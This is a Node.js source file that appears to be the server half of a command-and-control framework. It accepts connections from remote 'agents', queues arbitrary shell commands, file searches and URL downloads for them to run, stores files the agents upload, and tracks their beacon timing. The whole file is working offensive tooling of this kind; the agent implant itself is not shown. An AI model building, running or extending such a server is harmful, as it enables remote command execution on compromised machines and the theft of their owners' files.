const readline = require('readline');
const express = require('express');
const bodyParser = require('body-parser');
const fileUpload = require('express-fileupload');
const process = require('process');
const events = require('events');
const fs = require('fs');
const crypto = require('crypto');

// local imports
const Agent = require('./agent');

const app = express();

const PORT = 3000;
const CLIENTS_DIRECTORY = 'clients';
const CLIENT_TIMEOUT = 20 * 1000; // timeout of 20 seconds

const agents = {}; // connected agents

// ---------- helper functions ---------- //

function success(info) {
  console.log('\x1b[32m%s\x1b[0m', info);
}

function error(info) {
  console.log('\x1b[31m%s\x1b[0m', info);
}

function printUsage() {
  console.log('Usage: agent list\n' +
              '       agent <ID> cmd <command>\n' +
              '       agent <ID> pwd\n' +
              '       agent <ID> cd <dir>\n' +
              '       agent <ID> kill\n' +
              '       agent <ID> find <name> <location>\n' +
              '       agent <ID> delay <seconds>\n' +
              '       agent <ID> download <url> <location>\n' +
              '       exit\n');
}

// ---------- initialize prompt ---------- //

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

rl.setPrompt('> ');
rl.on('line', line => {
  // split line into command and arguments, filtering out empty strings
  let [cmd, ...args] = line.split(' ').filter(l => l.length != 0);

  if (cmd == 'agent') {
    if (args[0] == 'list') {
      listAgents();
    } else {
      const id = args[0];
      const agentCmd = args[1];

      if (id == undefined || agentCmd == undefined) {
        printUsage();
      } else {
        switch (agentCmd) {
          case 'cmd': {
            const command = args.slice(2);
            if (cmd.length == 0) {
              console.log('Usage: agent <ID> cmd <command>');
            } else if (id in agents) {
              sendCommand(id, command.join(' '));
            } else {
              error('An agent with that ID does not exist');
            }
            break;
          }

          case 'pwd': {
            if (id in agents) {
              pwd(id);
            } else {
              error('An agent with that ID does not exist');
            }
            break;
          }

          case 'cd': {
            const dir = args[2];
            if (dir == undefined) {
              console.log('Usage: agent <ID> cd <dir>');
            } else if (id in agents) {
              cd(id, dir);
            } else {
              error('An agent with that ID does not exist');
            }
            break;
          }

          case 'kill': {
            if (id in agents) {
              kill(id);
            } else {
              error('An agent with that ID does not exist');
            }
            break;
          }

          case 'find': {
            const [name, location] = args.slice(2);
            if (name == undefined || location == undefined) {
              console.log('Usage: agent <ID> find <name> <location>');
            } else if (id in agents) {
              find(id, name, location);
            } else {
              error('An agent with that ID does not exist');
            }
            break;
          }

          case 'delay': {
            const seconds = args[2];
            if (seconds == undefined) {
              console.log('Usage: agent <ID> delay <seconds>');
            } else if (id in agents) {
              setTime(id, parseInt(seconds, 10));
            } else {
              error('An agent with that ID does not exist');
            }
            break;
          }

          case 'download': {
            const [url, location] = args.slice(2);
            if (url == undefined) {
              console.log('Usage: agent <ID> download <url> <location>');
            } else if (id in agents) {
              download(id, url, location);
            } else {
              error('An agent with that ID does not exist');
            }
            break;
          }

          default: {
            printUsage();
          }
        }
      }
    }
  } else if (cmd == 'exit') {
    console.log('Shutting down server');
    process.exit();
  } else {
    printUsage();
  }
      
  rl.prompt();
});

// ---------- server commands ---------- //

function listAgents() {
  console.log('Connected agents:');
  for (let id in agents) {
    console.log(`Agent ${id}: ${JSON.stringify(agents[id])}`)
  }
}

function sendCommand(id, command) {
  console.log(`Executing ${command} on agent ${id}`);
  agents[id].queueCommand({ type: 'cmd', data: command });
}

function pwd(id) {
  agents[id].queueCommand({ type: 'pwd' });
}

function cd(id, dir) {
  console.log(`Changing directory to ${dir} on agent ${id}`);
  agents[id].queueCommand({ type: 'cd', data: dir });
}

function kill(id) {
  console.log(`Killing agent ${id}`);
  agents[id].queueCommand({ type: 'kill' });
}

function find(id, name, location) {
  console.log(`Finding files matching ${name} on agent ${id}`);
  agents[id].queueCommand({ type: 'find', data: { name, location } });
}

function setTime(id, seconds) {
  console.log(`Changing wait time to ${seconds} on agent ${id}`);
  agents[id].queueCommand({ type: 'delay', data: seconds });
}

function download(id, url, location) {
  if (location == undefined) {
    location = '';
    console.log(`Downloading ${url} to current working directory on agent ${id}`);
  } else {
    console.log(`Downloading ${url} to ${location} on agent ${id}`);
  }

  agents[id].queueCommand({ type: 'download', data: { url, location } });
}

// ---------- express endpoints ---------- //

// support parsing of application/json POST data
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(fileUpload());

app.post('/connect', (req, res) => {
  const agent = new Agent(req.body);
  const agentJson = JSON.stringify(agent);

  success(`New agent ${agentJson}`);

  if (!fs.existsSync(CLIENTS_DIRECTORY)) {
    fs.mkdirSync(CLIENTS_DIRECTORY);
  }

  if (!fs.existsSync(`${CLIENTS_DIRECTORY}/${agent.id}`)) {
    fs.mkdirSync(`${CLIENTS_DIRECTORY}/${agent.id}`);
  }

  fs.writeFile(`${CLIENTS_DIRECTORY}/${agent.id}/client_info.json`, agentJson, err => {
    if (err) {
      error(`Error saving client info: ${err}`);
    }
  });

  agents[agent.id] = agent;

  res.json({ id: agent.id });
});

app.post('/disconnect', (req, res) => {
  const { id } = req.body;
  success(`Agent ${id} has disconnected`);
  delete agents[id];
  res.end();
});

app.post('/command', (req, res) => {
  const { id } = req.body;
  let agent = agents[id];

  if (agent == undefined) {
    const client_info = `${CLIENTS_DIRECTORY}/${id}/client_info.json`;
    if (fs.existsSync(client_info)) {
      agent = new Agent(JSON.parse(fs.readFileSync(client_info)));
      agents[id] = agent;
      success(`Agent ${agent.id} successfully reconnected`);
    } else {
      error('Agent attempting reconnect not found!');
      return;
    }
  }

  agent.lastContacted = new Date();
  res.json(agent.getCommand());
});

app.post('/upload', (req, res) => {
  const { file } = req.files;
  const { id } = req.body;
  const filesDir = `${CLIENTS_DIRECTORY}/${id}/files`;

  if (!fs.existsSync(filesDir)) {
    fs.mkdirSync(filesDir);
  }

  file.mv(`${filesDir}/${file.name}`, err => {
    if (err) {
      error(`Error receiving file from ${id}: ${err}`);
    } else {
      success(`Received '${file.name}' from ${id}`);
    }
  });

  res.end();
});

app.post('/output', (req, res) => {
  const { output } = req.body;
  success(output);
  res.end();
});

// start server
app.listen(PORT, () => {
  console.log(`Started on port ${PORT}`);
  rl.prompt();
});

// check every so often that agents are still connected
setInterval(() => {
  for (let id in agents) {
    if (((new Date()) - agents[id].lastContacted) > CLIENT_TIMEOUT) {
      error(`Agent ${id} has timed out`);
      delete agents[id];
    }
  }
}, CLIENT_TIMEOUT);
